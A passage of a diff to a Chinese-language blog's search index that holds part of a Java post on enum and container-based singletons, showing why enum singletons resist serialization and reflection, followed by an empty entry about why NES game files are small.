+<h3 id="枚举单例"><a href="#枚举单例" class="headerlink" title="枚举单例"></a>枚举单例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span>  <span class="title">EnumSingleton</span> </span>&#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object date;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDate</span><span class="params">(Object date)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.date = date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> EnumSingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过反编译发现枚举类是通过静态代码块实现的饿汉式单例模式，反编译代码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">&#123;</span><br><span class="line">    INSTANCE = <span class="keyword">new</span> EnumSingleton(<span class="string">&quot;INSTANCE&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    $VALUES = (<span class="keyword">new</span> EnumSingleton[] &#123;</span><br><span class="line">        INSTANCE</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>枚举缓存既不会被序列化破坏，也不会被反射破坏。</p>
+<p>对于序列化，在 ObjectInputStream 类中 readEnum() 方法里，发现枚举类型是通过类名和 Class 对象类找到唯一的枚举对象，代码如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/11AC67F5-4A3E-427F-A758-9C7AA9A20444.png" alt="readEnum"></p>
+<p>对于反射，Constructor 类中的 newInstance() 方法对于枚举类，直接抛出异常：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/9286BD38-C4BA-468A-A523-B6EAD2569951.png" alt="newInstance"></p>
+<h3 id="容器缓存单例"><a href="#容器缓存单例" class="headerlink" title="容器缓存单例"></a>容器缓存单例</h3><p>可以看看 Spring 容器式单例实现：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/31EC471D-8239-49AC-88B9-BA5C538D97D7.png" alt="Spring容器"></p>
+]]></content>
+      <categories>
+        <category>java</category>
+      </categories>
+      <tags>
+        <tag>源码</tag>
+        <tag>设计模式</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>红白机游戏文件如何做到这么小</title>
+    <url>/why-NES-file-so-small.html</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>问答</category>
+      </categories>
+      <tags>
+        <tag>红白机</tag>
       </tags>
   </entry>
   <entry>
